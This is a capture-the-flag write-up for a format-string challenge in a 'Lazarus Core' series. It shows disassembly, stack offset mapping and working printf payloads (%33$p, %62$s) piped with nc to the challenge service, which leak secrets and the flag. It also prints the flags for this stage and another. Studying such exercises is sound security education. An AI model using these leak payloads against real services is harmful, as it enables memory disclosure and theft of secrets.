# Lazarus Core 3/5 — Diag Port

**Flag:** `reentry{f0rm4t_str1ng_l34k3d_th3_gu4rdi4n}`  (read from the live instance)
**Secret read on the way:** `LOAD_EPOCH = 0xc0ffee19770f5b` (the "freshness value" needed in stage 5)

| | |
|---|---|
| Category | pwn (format string) |
| Service | `nc 0.cloud.chals.io 30918` (offline now — event closed) |
| Tools | `objdump`, `nm`, `python3`, `nc` |
| Files | [files/diag](files/diag) (ELF 64-bit, not stripped), [files/core.bin](files/core.bin) (stage 2) |

> **Challenge brief:** Buried in the core dump was a diagnostic-port token. LAZARUS's diag port
> echoes every query you send it straight back into its own log — helpfully, verbatim. Helpful is
> the wrong thing for a guardian to be. Read what it shouldn't show you — including the guardian's
> core LOAD EPOCH, the freshness value any re-forged core must carry.

---

## Short version

`diag` is a non-stripped x86-64 ELF. After the correct token ("port open") it enters a `query>`
loop that reads a line and calls `printf(user_input)` **four times** — a classic **format string
bug**. On the stack, just above the input buffer, sit three telemetry secrets and a pointer to
the `flag.txt` buffer.

| What | Value | How to read | arg |
|---|---|---|---|
| IMAGE_BASE | `0x0000555555400000` | `%31$p` | 31 |
| GUARDIAN_CANARY | `0x5e3a1c00deadface` | `%32$p` | 32 |
| **LOAD_EPOCH** | **`0xc0ffee19770f5b`** | **`%33$p`** | 33 |
| `flag.txt` buffer | the flag | `%62$s` (or qwords from `%34$p`) | 62 |

The token to open the port is stored in `core.bin`'s `CDTOK` chunk (XOR `0x5e`) and is
**`DIAG-PORT-5E3A1C`**. The binary also accepts the built-in fallback `DIAG-TEST` when no
`dtok.txt` is present. The actual flag lives in `flag.txt` next to the service and is read with
`%62$s` on the live instance.

---

## 1. Identify the binary

```bash
file diag        # ELF 64-bit, x86-64, dynamically linked, not stripped
strings -n 5 diag
```

Important strings: `DIAG-TES` (default token fragment), `dtok.txt`, `flag.txt`,
`== LAZARUS DIAGNOSTIC PORT ==`, `diag-port token>`, `port sealed.` (wrong token),
`port open. telemetry in scope: image base, stack guard, CORE LOAD EPOCH.`, `query>`,
`<flag unavailable: flag.txt not present on this node>`, and the global symbols
`GUARDIAN_CANARY`, `IMAGE_BASE`, `LOAD_EPOCH`. "diagnostic queries echo to the log" + "verbatim"
is a textbook format-string hint.

---

## 2. `main` logic

```bash
objdump -d -M intel diag | sed -n '/<main>:/,/<_fini>:/p'
```

1. `setvbuf(..., _IONBF)` — no buffering.
2. Builds the default token on the stack: `"DIAG-TES"` + `'T'` = `"DIAG-TEST"`.
3. `fopen("dtok.txt","r")` — if the file exists, overwrites the token with its contents.
4. `printf("diag-port token> ")`, `fgets`, strip `\n`.
5. `strcmp(input, token)`: different → `port sealed.` and exit; equal → continue.
6. `fopen("flag.txt","r")` → `fgets` into buffer `[rbp-0x100]`. If missing →
   `<flag unavailable...>`.
7. Loads telemetry onto the stack (from `.rodata @ 0x402008`):
   - `[rbp-0x118]` = `IMAGE_BASE`      = `0x0000555555400000`
   - `[rbp-0x110]` = `GUARDIAN_CANARY` = `0x5e3a1c00deadface`
   - `[rbp-0x108]` = `LOAD_EPOCH`      = `0x00c0ffee19770f5b`
   - `[rbp-0x20]`  = **pointer** to the `flag.txt` buffer
8. `puts("port open. telemetry in scope: ...")`.
9. **Loop 4×:** `printf("query> "); fgets(buf=[rbp-0x1e0], 0xc0, stdin);` strip `\n`;
   `printf(buf);` ← **BUG: user controls the format string**; `putchar('\n')`.

In step 9 the input is the **first** argument to `printf` (the format), with no `"%s"`, so
`%p`/`%x`/`%s` read successive "arguments" — actually registers and stack words, including the
telemetry and the flag pointer.

> **Verification note:** On `files/core.bin` I confirmed the `CDTOK` token decodes to
> `DIAG-PORT-5E3A1C`, and `.rodata` holds `LOAD_EPOCH = 0xc0ffee19770f5b` (bytes
> `5b0f7719 eeffc000`). Running `files/diag` locally opens the port and the format-string loop
> works (verified with a dummy `flag.txt`). The actual flag comes from the live instance, which
> is offline now.

---

## 3. Recover the token from `core.bin` (`CDTOK` chunk)

```bash
python3 -c "d=open('core.bin','rb').read();i=d.find(b'CDTOK');n=int.from_bytes(d[i+5:i+7],'little');print(bytes(b^0x5e for b in d[i+7:i+7+n]).decode())"
# DIAG-PORT-5E3A1C
```

Note: `5E3A1C` is the top three bytes of `GUARDIAN_CANARY = 0x5e3a1c00...`, and the XOR key
`0x5e` is the top byte of that value. To make the **local** binary use the real token, write it
to `dtok.txt`:

```bash
printf 'DIAG-PORT-5E3A1C' > dtok.txt
```

---

## 4. Map the stack to argument indices

The `printf` buffer is at `[rbp-0x1e0]`, 192 bytes, so it occupies args **6–29**. Using
`arg = 6 + (offset_from_rsp)/8` with `rsp = rbp-0x1e0`:

| Variable | Address | arg |
|---|---|---|
| IMAGE_BASE | `[rbp-0x118]` | **31** |
| GUARDIAN_CANARY | `[rbp-0x110]` | **32** |
| LOAD_EPOCH | `[rbp-0x108]` | **33** |
| flag buffer (bytes) | `[rbp-0x100]` | **34+** |
| pointer to flag | `[rbp-0x20]` | **62** |

Direct parameter access (`%N$...`) reaches position `N` directly.

---

## 5. Leak the telemetry (including CORE LOAD EPOCH)

```bash
printf 'DIAG-PORT-5E3A1C\nIMG=%%31$p CANARY=%%32$p EPOCH=%%33$p\n' | ./diag
# IMG=0x555555400000 CANARY=0x5e3a1c00deadface EPOCH=0xc0ffee19770f5b
```

➡️ **CORE LOAD EPOCH = `0xc0ffee19770f5b`** (`%33$p`) — the secret the port should not show, and
the "freshness value" needed to re-forge the core in stage 5. It contains `1977` (the `EPOK`
chunk from `core.bin`).

---

## 6. Read the flag (`flag.txt`) via format string

**Method A — `%s` through the pointer (arg 62):**

```bash
printf 'DIAG-PORT-5E3A1C\n%%62$s\n' | nc 0.cloud.chals.io 30918
# query> reentry{f0rm4t_str1ng_l34k3d_th3_gu4rdi4n}
```

**Method B — rebuild from raw qwords (arg 34+):** each `%p` is 8 bytes of the flag in
little-endian; concatenate and decode.

🚩 **Flag:** `reentry{f0rm4t_str1ng_l34k3d_th3_gu4rdi4n}`

Locally, with no `flag.txt`, the port returns `<flag unavailable...>`, so the exploit is built on
the downloaded binary and the flag is taken from the running instance.

---

## Note on `flag.enc`

`flag.enc` is **not** this stage's flag. It is stage 4's artifact: `SIG2` and `SIG4` reuse the
ECDSA nonce, which recovers KEPLER's private key and then unmasks `flag.enc` →
`reentry{n0nc3_r3us3_br0k3_th3_gu4rdi4n_k3y}` (see [4 - Signature](4%20-%20Signature.md)).

## Lessons

- "Echo verbatim" = format string. User input as the first `printf` argument lets you read the
  stack (`%p`/`%x`/`%s`, `%N$...` for direct access).
- Compute the offsets from the disassembly (`rsp = rbp-0x1e0`, `arg = 6 + offset/8`) and hit the
  secret on the first try.
- Secrets on the stack leak even when the program "officially" shows only telemetry — the pointer
  to `flag.txt` was in the frame, and `%62$s` dereferences it.

> **Previous:** [2 - Memory Dump](2%20-%20Memory%20Dump.md) · **Next:** [4 - Signature](4%20-%20Signature.md)
